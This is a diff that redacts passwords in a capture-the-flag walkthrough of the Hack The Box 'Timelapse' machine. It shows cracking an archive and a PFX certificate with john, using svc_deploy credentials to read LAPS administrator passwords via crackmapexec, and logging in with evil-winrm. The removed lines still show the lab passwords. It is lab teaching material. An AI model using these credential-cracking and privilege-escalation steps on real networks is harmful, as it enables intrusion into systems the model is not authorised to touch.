@@ -99,14 +99,14 @@ winrm_backup.zip archive has a password, we will try to brute it with `john`.
 ```zsh
 $ zip2john winrm_backup.zip > hash
 $ john --wordlist=rockyou.txt hash
-supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+-- EDITED --    (winrm_backup.zip/legacyy_dev_auth.pfx)
 ```
 
 legacyy_dev_auth.pfx is a `PKCS#12` file format, contains the SSL certificate (public keys) and the corresponding private keys. But it requires password to extract. Let's convert it to hash and brute it again!
 ```zsh
 $ pfx2john legacyy_dev_auth.pfx > hash
 $ john --wordlist=rockyou.txt hash
-thuglegacy       (legacyy_dev_auth.pfx)
+-- EDITED --       (legacyy_dev_auth.pfx)
 ```
 
 Now we got the password and able to extract a certificate and a private key. We use `openssl` library to do that.
@@ -138,7 +138,7 @@ whoami
 ipconfig /all
 netstat -ano |select-string LIST
 $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
-$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$p = ConvertTo-SecureString '-- EDITED --' -AsPlainText -Force
 $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
 invoke-command -computername localhost -credential $c -port 5986 -usessl -
 SessionOption $so -scriptblock {whoami}
@@ -146,20 +146,20 @@ get-aduser -filter * -properties *
 exit
 ```
 
-We can see the credentials here: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`.
+We can see the credentials here: `svc_deploy:-- EDITED --`.
 
 svc_deploy user is a member of `LAPS_Readers` group, which can extract `Local Administrator` password. We are using `crackmapexec` to do that.
 
 ```zsh
-$ crackmapexec smb timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps  
+$ crackmapexec smb timelapse.htb -u 'svc_deploy' -p '-- EDITED --' --laps  
 SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
-SMB         timelapse.htb   445    DC01             [-] DC01\administrator:ImM+fZ5b;G82H&S+5.&5)sW} STATUS_LOGON_FAILURE
+SMB         timelapse.htb   445    DC01             [-] DC01\administrator:-- EDITED -- STATUS_LOGON_FAILURE
 ```
 
-Then, we got it: `administrator:ImM+fZ5b;G82H&S+5.&5)sW}`. It's time to log in and get the flag!
+Then, we got it: `administrator:-- EDITED --`. It's time to log in and get the flag!
 
 ```zsh
-$ evil-winrm -i timelapse.htb -u 'administrator' -p 'ImM+fZ5b;G82H&S+5.&5)sW}' -S
+$ evil-winrm -i timelapse.htb -u 'administrator' -p '-- EDITED --' -S
 *Evil-WinRM* PS C:\Users\Administrator\Documents> gci -Path C:\ -Recurse -Include 'root.txt'
     Directory: C:\Users\TRX\Desktop
 -ar---         7/1/2022   9:25 AM             34 root.txt
